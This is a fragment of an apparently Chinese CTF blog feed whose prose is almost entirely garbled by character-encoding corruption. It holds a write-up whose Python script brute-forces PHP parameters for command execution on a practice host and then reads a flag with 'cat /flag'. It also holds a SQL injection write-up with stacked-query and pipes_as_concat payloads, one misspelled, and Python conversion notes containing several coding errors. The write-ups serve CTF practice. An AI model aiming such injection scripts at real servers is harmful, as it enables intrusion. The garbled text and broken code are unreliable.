    <content type="html"><![CDATA[<h2 id="buuä¸Šå¼ºç½‘æ¯é«˜æ˜çš„é»‘å®¢"><a href="#buuä¸Šå¼ºç½‘æ¯é«˜æ˜çš„é»‘å®¢" class="headerlink" title="buuä¸Šå¼ºç½‘æ¯é«˜æ˜çš„é»‘å®¢"></a>buuä¸Šå¼ºç½‘æ¯é«˜æ˜çš„é»‘å®¢</h2><p><img src="https://img-blog.csdnimg.cn/20210419233615169.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å…¥é¢˜å°±æ˜¯ç›´æ¥ç»™äº†ä¸€ä¸ªå‹ç¼©åŒ…ä¸‹è½½ä¸‹æ¥ä¹‹åä¼šå‘ç°æ˜¯è¶…çº§å¤šçš„phpä»£ç æœ‰ç‚¹åƒæ—¥å¿—ï¼Œæ‰“å¼€åæµè§ˆä¸€ä¸‹å°±ä¼šå‘ç°å¾ˆå¤špost getå‚æ•°ï¼Œè¿˜æœ‰å†…æ•›æ‰§è¡Œå‘½ä»¤ï¼ŒçŒœæµ‹å¯ä»¥åˆ©ç”¨æŸä¸ªå‚æ•°æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œæ€è·¯å¾ˆç®€å•ï¼Œè¿™é¢˜è€ƒçš„åº”è¯¥å°±æ˜¯è„šæœ¬èƒ½åŠ›ã€‚<br><img src="https://img-blog.csdnimg.cn/20210419233751848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä»£ç å¦‚ä¸‹ï¼Œå†™è„šæœ¬è¿‡ç¨‹æŒºéš¾å—ï¼Œä¹Ÿè¯•è¿‡å¤šçº¿ç¨‹ä½†æœ€åæ€»æ˜¯ä¸€äº›æ•°æ®è¿åœ¨ä¸€èµ·ï¼Œç›®å‰è¿˜æ²¡è§£å†³ï¼Œæœ€åæ‹¿äº†å¤§ä½¬çš„è„šæœ¬è·‘ä¹Ÿæ²¡è·‘å‡ºæ¥ï¼Œä¸‹é¢çš„è„šæœ¬è¿˜æ˜¯ç”¨çš„ç¬¨æ–¹æ³•ï¼Œå›å¤´å†ç ”ç©¶ä¸€ä¸‹å¤šçº¿ç¨‹çš„é—®é¢˜å§ã€‚</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br>s = requests.session()<br>rootdir = <span class="hljs-string">&#x27;D:\pythonwp\\buuweb\å¼ºç½‘æ¯\src&#x27;</span><br>file_list = os.listdir(rootdir)<br>useful_param = []<br>flag = <span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>(<span class="hljs-params">file</span>):</span><br>    <span class="hljs-keyword">global</span> flag<br>    <span class="hljs-keyword">global</span> useful_param<br>    <span class="hljs-comment"># print(&quot;try&quot;)</span><br>    re_GETpayload = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>,)<br>    re_POSTpayload = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>)<br>    path = os.path.join(rootdir, file)<br>    <span class="hljs-comment"># print(path)</span><br>    url = <span class="hljs-string">&#x27;http://93dec788-f1ac-4f32-99e4-943960f2f002.node3.buuoj.cn/&#x27;</span> + file<br>    <span class="hljs-built_in">print</span>(url)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-comment"># print(f.read())</span><br>        res = f.read()<br>        GET_param = re.findall(re_GETpayload,res)<br>        POST_param = re.findall(re_POSTpayload,res)<br>    <span class="hljs-keyword">if</span> file == <span class="hljs-string">&#x27;xk0SzyKwfzw.php&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(GET_param)<br>        <span class="hljs-built_in">print</span>(POST_param)<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(POST_param)):<br>        <span class="hljs-built_in">print</span>(POST_param[k])<br>        res_post = s.post(url=url, data=&#123;POST_param[k]: <span class="hljs-string">&#x27;echo hello&#x27;</span>&#125;)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;hello&#x27;</span> <span class="hljs-keyword">in</span> res_post.text:<br>            <span class="hljs-comment"># useful_param.append(data)</span><br>            <span class="hljs-built_in">print</span>(POST_param[k])<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ok&quot;</span>)<br>            flag = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(GET_param)):<br>        payload = url + <span class="hljs-string">&quot;?&quot;</span> + GET_param[k] + <span class="hljs-string">&quot;=&quot;</span> + <span class="hljs-string">&#x27;echo hello&#x27;</span><br>        <span class="hljs-comment"># print(payload)</span><br>        <span class="hljs-comment"># print(data)</span><br>        res_get = s.get(url=payload)<br>        <span class="hljs-keyword">if</span> file == <span class="hljs-string">&#x27;xk0SzyKwfzw.php&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(payload)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;hello&#x27;</span> <span class="hljs-keyword">in</span> res_get.text:<br>            <span class="hljs-comment"># useful_param.append(data)</span><br>            <span class="hljs-built_in">print</span>(GET_param[k])<br>            flag = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(file_list)-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<span class="hljs-comment">#åŠ å…¥å¤šçº¿ç¨‹</span><br>   <span class="hljs-comment"># t = threading.Thread(target=exp,args=(file_list[i],))</span><br>   <span class="hljs-comment"># t.start()</span><br>   exp(file_list[i])<br>   <span class="hljs-keyword">if</span> flag == <span class="hljs-number">1</span>:<br>       <span class="hljs-keyword">break</span><br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210420003856335.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç»“æœå¦‚ä¸Šï¼Œå¯ä»¥å‘ç°å¯åˆ©ç”¨çš„phpæ–‡ä»¶æ˜¯xk0SzyKwfzw.phpï¼Œå‚æ•°ä¸ºEfa5BVGï¼Œæœ€åæ„é€ payloadä¸ºEfa5BVG=cat /flagå³å¯å¾—åˆ°flag<br><img src="https://img-blog.csdnimg.cn/20210420003924620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    
    <categories>
      
      <category>buuåˆ·é¢˜è®°å½•</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>BUU</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUä¸€é“å…³äºæ³¨å…¥çš„é¢˜</title>
    <link href="/2021/04/18/2021-4-16-BUU%E4%B8%80%E9%81%93%E5%85%B3%E4%BA%8E%E6%B3%A8%E5%85%A5%E7%9A%84%E9%A2%98/"/>
    <url>/2021/04/18/2021-4-16-BUU%E4%B8%80%E9%81%93%E5%85%B3%E4%BA%8E%E6%B3%A8%E5%85%A5%E7%9A%84%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h2 id="BUUä¸€é“å…³äºæ³¨å…¥çš„é¢˜"><a href="#BUUä¸€é“å…³äºæ³¨å…¥çš„é¢˜" class="headerlink" title="BUUä¸€é“å…³äºæ³¨å…¥çš„é¢˜"></a>BUUä¸€é“å…³äºæ³¨å…¥çš„é¢˜</h2><p>ç‰¹ç‚¹ï¼šä¸åŒäºä¸€èˆ¬çš„æ³¨å…¥é¢˜ï¼Œè¿™é¢˜åˆ™éœ€è¦ä½ çŒœæµ‹åç«¯çš„æŸ¥è¯¢è¯­å¥<br>å…¥é¢˜éšä¾¿è¾“ä¸ªæ•°å­—é¡µé¢å¦‚å›¾<img src="https://img-blog.csdnimg.cn/20210201194521105.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¾“å…¥å­—ç¬¦æ—¶æ— å›æ˜¾ï¼Œå…ˆå°è¯•äº†ä¸‹ç®€å•çš„å‡ ä¸ªè¯­å¥<img src="https://img-blog.csdnimg.cn/20210201194631904.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20210201194854948.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20210201194913481.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>çŒœæµ‹æŸäº›å…³é”®å­—è¢«è¿‡æ»¤ï¼Œå°è¯•è¾“union,if,andç­‰ç­‰å‘ç°éƒ½æ˜¾ç¤º Nonono<br>æœ€åè¯•äº†ä¸‹å †å æ³¨å…¥<img src="https://img-blog.csdnimg.cn/20210201195116950.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br> ç»ˆäºæœ‰ååº”äº†ï¼Œç»§ç»­å°è¯•å‡†å¤‡æŸ¥çœ‹å­—æ®µåä»ç„¶æ˜¾ç¤ºNonono<br> åœ¨è¿™é‡ŒæŒ£æ‰äº†è®¸ä¹…ï¼Œæœ€åæ²¡åŠæ³•äº†åªæœ‰ä¹–ä¹–å»çœ‹å¤§ä½¬çš„wpï¼Œç¡®å®è¶…å‡ºäº†è‡ªå·±çš„çŸ¥è¯†èŒƒå›´</p><h4 id="æ­£è§£"><a href="#æ­£è§£" class="headerlink" title="æ­£è§£"></a>æ­£è§£</h4><p>è¿™é“é¢˜ç›®éœ€è¦æˆ‘ä»¬å»å¯¹åç«¯è¯­å¥è¿›è¡ŒçŒœæµ‹ï¼Œæœ‰ç‚¹çŸ›ç›¾çš„åœ°æ–¹åœ¨äºå…¶æè¿°çš„åŠŸèƒ½å’Œå®é™…çš„åŠŸèƒ½ä¼¼ä¹å¹¶ä¸ç›¸ç¬¦ï¼Œé€šè¿‡è¾“å…¥éé›¶æ•°å­—å¾—åˆ°çš„å›æ˜¾1å’Œè¾“å…¥å…¶ä½™å­—ç¬¦å¾—ä¸åˆ°å›æ˜¾æ¥åˆ¤æ–­å‡ºå†…éƒ¨çš„æŸ¥è¯¢è¯­å¥å¯èƒ½å­˜åœ¨æœ‰||ï¼Œä¹Ÿå°±æ˜¯select è¾“å…¥çš„æ•°æ®||å†…ç½®çš„ä¸€ä¸ªåˆ—å from è¡¨åï¼Œè¿›ä¸€æ­¥è¿›è¡ŒçŒœæµ‹å³ä¸ºselect postè¿›å»çš„æ•°æ®||flag from Flag(å«æœ‰æ•°æ®çš„è¡¨åï¼Œé€šè¿‡å †å æ³¨å…¥å¯çŸ¥)ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ­¤æ—¶çš„||èµ·åˆ°çš„ä½œç”¨æ˜¯orçš„ä½œç”¨ã€‚æœ€ç»ˆå¯æ¨æµ‹å‡ºå†…ç½®çš„sqlè¯­å¥ä¸º</p><figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">sql</span>=â€œselectâ€.post[â€˜queryâ€™].<span class="hljs-string">&quot;||flag from Flag&quot;</span><span class="hljs-comment">;</span><br></code></pre></div></td></tr></table></figure><p>æ‰€ä»¥è§£æ³•ä¸€ï¼š<br>å¦‚æœ$post[â€˜queryâ€™]çš„æ•°æ®ä¸º*,1ï¼Œsqlè¯­å¥å°±å˜æˆäº†</p><figure class="highlight sqf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sqf"><span class="hljs-built_in">select</span> *,<span class="hljs-number">1</span>||<span class="hljs-built_in">flag</span> <span class="hljs-keyword">from</span> <span class="hljs-built_in">Flag</span><br></code></pre></div></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯</p><figure class="highlight sqf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sqf"><span class="hljs-built_in">select</span> *,<span class="hljs-number">1</span> <span class="hljs-keyword">from</span> <span class="hljs-built_in">Flag</span><br></code></pre></div></td></tr></table></figure><p>è§£æ³•äºŒï¼š<br>è¾“å…¥</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">1;<span class="hljs-attribute">set_mode</span>=pips_as_concat;select 1<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210201200415125.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‚è€ƒæ–‡ç« ï¼š<br><a href="https://blog.csdn.net/weixin_42373127/article/details/88866710">https://blog.csdn.net/weixin_42373127/article/details/88866710</a><br><a href="https://blog.csdn.net/weixin_44866139/article/details/105857487?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-3&spm=1001.2101.3001.4242">https://blog.csdn.net/weixin_44866139/article/details/105857487?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-3&amp;spm=1001.2101.3001.4242</a></p>]]></content>
    
    
    <categories>
      
      <category>buuåˆ·é¢˜è®°å½•</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>BUU</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pythonå­¦ä¹ ç¬”è®°1</title>
    <link href="/2021/04/17/2021-4-17-python%E7%AC%94%E8%AE%B0/"/>
    <url>/2021/04/17/2021-4-17-python%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="python3ä¸­å…³äºå­—èŠ‚ï¼Œå­—ç¬¦ä¸²ï¼Œè¿›åˆ¶ï¼Œç¼–ç ä¹‹é—´çš„æ€»ç»“åŒºåˆ†"><a href="#python3ä¸­å…³äºå­—èŠ‚ï¼Œå­—ç¬¦ä¸²ï¼Œè¿›åˆ¶ï¼Œç¼–ç ä¹‹é—´çš„æ€»ç»“åŒºåˆ†" class="headerlink" title="python3ä¸­å…³äºå­—èŠ‚ï¼Œå­—ç¬¦ä¸²ï¼Œè¿›åˆ¶ï¼Œç¼–ç ä¹‹é—´çš„æ€»ç»“åŒºåˆ†"></a>python3ä¸­å…³äºå­—èŠ‚ï¼Œå­—ç¬¦ä¸²ï¼Œè¿›åˆ¶ï¼Œç¼–ç ä¹‹é—´çš„æ€»ç»“åŒºåˆ†</h1><p>æœ€è¿‘å­¦ä¹ ctfä¸­çš„å¯†ç å­¦ä¼šç»å¸¸ç”¨åˆ°pythonä½†æ˜¯å¯¹pythonä¸­çš„è¿›åˆ¶è½¬æ¢ï¼Œä»€ä¹ˆæ—¶å€™è¦ç”¨å­—èŠ‚å½¢å¼ï¼Œä»€ä¹ˆæ—¶å€™è¦ç”¨åˆ°å­—ç¬¦ä¸²å½¢å¼ä»¥åŠè¿›åˆ¶å’Œå„ç§ç¼–ç æ··åœ¨ä¸€èµ·ï¼Œè¿™äº›åˆ†ä¸å¤ªæ¸…æ¥šåšé¢˜æ—¶å¾ˆæµªè´¹æ—¶é—´ï¼Œæ‰€ä»¥æ¥æ€»ç»“åŒºåˆ†ä¸€ä¸‹â€¦</p><h3 id="é¦–å…ˆå¯¹äºå­—èŠ‚å’Œå­—ç¬¦ä¸²ï¼Œä¸¤è€…å½¢å¼ä¸Šçš„åŒºåˆ«åœ¨äºå­—èŠ‚å½¢å¼ä¸Šä¼šæœ‰ä¸€ä¸ªbï¼Œç±»ä¼¼äºä¸‹é¢"><a href="#é¦–å…ˆå¯¹äºå­—èŠ‚å’Œå­—ç¬¦ä¸²ï¼Œä¸¤è€…å½¢å¼ä¸Šçš„åŒºåˆ«åœ¨äºå­—èŠ‚å½¢å¼ä¸Šä¼šæœ‰ä¸€ä¸ªbï¼Œç±»ä¼¼äºä¸‹é¢" class="headerlink" title="é¦–å…ˆå¯¹äºå­—èŠ‚å’Œå­—ç¬¦ä¸²ï¼Œä¸¤è€…å½¢å¼ä¸Šçš„åŒºåˆ«åœ¨äºå­—èŠ‚å½¢å¼ä¸Šä¼šæœ‰ä¸€ä¸ªbï¼Œç±»ä¼¼äºä¸‹é¢"></a>é¦–å…ˆå¯¹äºå­—èŠ‚å’Œå­—ç¬¦ä¸²ï¼Œä¸¤è€…å½¢å¼ä¸Šçš„åŒºåˆ«åœ¨äºå­—èŠ‚å½¢å¼ä¸Šä¼šæœ‰ä¸€ä¸ªbï¼Œç±»ä¼¼äºä¸‹é¢</h3><p><img src="https://img-blog.csdnimg.cn/20210303210727212.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¸¤è€…ä¹Ÿå¯ä»¥è¿›è¡Œè½¬æ¢ï¼Œå¦‚ä¸‹å›¾</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;hello world!&quot;</span><br>byte = <span class="hljs-built_in">str</span>.encode()   <span class="hljs-comment">#å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—èŠ‚å½¢å¼ &gt;&gt;b&quot;hello world!&quot;</span><br><span class="hljs-built_in">str</span> = byte.decode() <span class="hljs-comment">#å­—èŠ‚å½¢å¼è½¬æ¢ä¸ºå­—ç¬¦ä¸²</span><br><br></code></pre></div></td></tr></table></figure><h3 id="å…³äºè¿›åˆ¶ä¹‹é—´ã€‚"><a href="#å…³äºè¿›åˆ¶ä¹‹é—´ã€‚" class="headerlink" title="å…³äºè¿›åˆ¶ä¹‹é—´ã€‚"></a>å…³äºè¿›åˆ¶ä¹‹é—´ã€‚</h3><p>å¯¹äºæœ€åŸºç¡€çš„è¿›åˆ¶ä¹‹é—´çš„è½¬æ¢ï¼Œæœ€å¸¸ç”¨çš„åº”å½“æ˜¯pythonçš„å‡ ä¸ªå†…ç½®å‡½æ•°ï¼Œä¾‹å¦‚int()  ,   hex()   ,   bin()   ï¼Œoct()ï¼Œä»£ç å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">int</span>(x,base)     <span class="hljs-comment">#ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ‰€ç»™æ•°å­—æˆ–è€…å­—ç¬¦ä¸²ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºè¿›åˆ¶æ•°</span><br><span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;0xa&#x27;</span>,<span class="hljs-number">16</span>)   <span class="hljs-comment">#å°†æ‰€ç»™å­—ç¬¦ä¸²æŒ‰ç…§åå…­è¿›åˆ¶å½¢å¼è½¬åŒ–ä¸ºåè¿›åˆ¶  ç»“æœä¸º10</span><br><span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;0b100&#x27;</span>,<span class="hljs-number">2</span>)  <span class="hljs-comment">#æŒ‰äºŒè¿›åˆ¶è½¬æ¢ä¸ºåè¿›åˆ¶  ï¼Œç»“æœä¸º4</span><br><span class="hljs-built_in">bin</span>(<span class="hljs-number">10</span>)         <span class="hljs-comment">#&gt;&gt;&#x27;0b1010&#x27;</span><br><span class="hljs-built_in">hex</span>(<span class="hljs-number">255</span>)        <span class="hljs-comment">#&gt;&gt;&#x27;0xff&#x27;</span><br><span class="hljs-built_in">oct</span>(<span class="hljs-number">10</span>)  <span class="hljs-comment">#&gt;&gt;å°†åè¿›åˆ¶è½¬æ¢ä¸ºå…«è¿›åˆ¶   ç»“æœä¸º &#x27;012&#x27;</span><br></code></pre></div></td></tr></table></figure><h3 id="å…³äºè¿›åˆ¶ä¸å­—ç¬¦ä¸²ä¹‹é—´çš„è½¬æ¢"><a href="#å…³äºè¿›åˆ¶ä¸å­—ç¬¦ä¸²ä¹‹é—´çš„è½¬æ¢" class="headerlink" title="å…³äºè¿›åˆ¶ä¸å­—ç¬¦ä¸²ä¹‹é—´çš„è½¬æ¢"></a>å…³äºè¿›åˆ¶ä¸å­—ç¬¦ä¸²ä¹‹é—´çš„è½¬æ¢</h3><p>æœ€å¸¸ç”¨çš„è¿˜æ˜¯å­—ç¬¦ä¸²åå…­è¿›åˆ¶çš„è½¬æ¢ï¼Œä»£ç å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str_to_hex</span>(<span class="hljs-params">s</span>):</span><br>    <span class="hljs-keyword">return</span> [<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s]<br><span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;hello&#x27;</span><br>ptint(str_to_hex(<span class="hljs-built_in">str</span>))         <span class="hljs-comment">#&gt;&gt;[&#x27;0x68&#x27;, &#x27;0x65&#x27;, &#x27;0x6c&#x27;, &#x27;0x6c&#x27;, &#x27;0x6f&#x27;]</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>.encode().<span class="hljs-built_in">hex</span>())      <span class="hljs-comment">#&gt;&gt;è¾“å‡ºä¸º&#x27;68656c6c6f&#x27;</span><br>hexstr = <span class="hljs-string">&#x27;68656c6c6f&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(hexstr))   <span class="hljs-comment">#è¾“å‡ºä¸ºb&#x27;hello&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hex_to_str</span>(<span class="hljs-params">s</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-built_in">int</span>(b, <span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> s]])<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str_to_bin</span>(<span class="hljs-params">s</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27; &#x27;</span>.join([<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">ord</span>(c)) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s])<br><span class="hljs-built_in">print</span>(str_to_bin(<span class="hljs-built_in">str</span>))     <span class="hljs-comment">#&gt;&gt;&#x27;0b11010000b11001010b11011000b11011000b1101111&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bin_to_str</span>(<span class="hljs-params">s</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-built_in">int</span>(b, <span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> s.split(<span class="hljs-string">&#x27; &#x27;</span>)]])<br></code></pre></div></td></tr></table></figure><h3 id="å…³äºå­—ç¬¦ä¸²å’Œç¼–ç ä¹‹é—´"><a href="#å…³äºå­—ç¬¦ä¸²å’Œç¼–ç ä¹‹é—´" class="headerlink" title="å…³äºå­—ç¬¦ä¸²å’Œç¼–ç ä¹‹é—´"></a>å…³äºå­—ç¬¦ä¸²å’Œç¼–ç ä¹‹é—´</h3><p>æœ€å¸¸ç”¨æœ‰å…³äºASCIIè½¬ç çš„å‡½æ•°ord()chr()</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)   <span class="hljs-comment">#è¾“å‡ºä¸º97   è½¬ASCIIç </span><br><span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>)    <span class="hljs-comment">#è¾“å‡ºä¸º&#x27;a&#x27;  ASCIIè½¬å­—ç¬¦</span><br><span class="hljs-comment">#è¿˜å¯ä»¥ç”¨Cryptoåº“</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes,bytes_to_long<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-number">97</span>))    <span class="hljs-comment">#è¾“å‡ºä¸ºå­—èŠ‚å‹  b&#x27;a&#x27;  bytes_to_longåŒç†</span><br>  <br></code></pre></div></td></tr></table></figure><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>åœ¨python3ä¹‹åå­—èŠ‚ä¸å­—ç¬¦ä¸²ä»¥åŠå„ç§ç¼–ç ä¹‹é—´å·²ç»åˆ’åˆ†çš„éå¸¸æ˜ç¡®ï¼Œå¦‚æœå¯¹è¿™äº›è½¬æ¢ä¸æ˜¯å¾ˆæ˜ç¡®åœ¨å­¦ä¹ ä¸­ä¼šå¾ˆæµªè´¹æ—¶é—´ï¼Œæ‰€ä»¥å†æ¬¡è§£å†³è¿™äº›å›°æƒ‘è¿˜æ˜¯å¾ˆæœ‰å¸®åŠ©çš„ã€‚</p><p><a href="https://blog.csdn.net/mxj588love/article/details/80692964?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161477764216780262566198%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161477764216780262566198&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-80692964.pc_search_result_hbase_insert&utm_term=python%20%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6">å‚è€ƒæ–‡ç« 1</a></p>]]></content>
    
    
    <categories>
      
      <category>pythonå­¦ä¹ è®°å½•</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
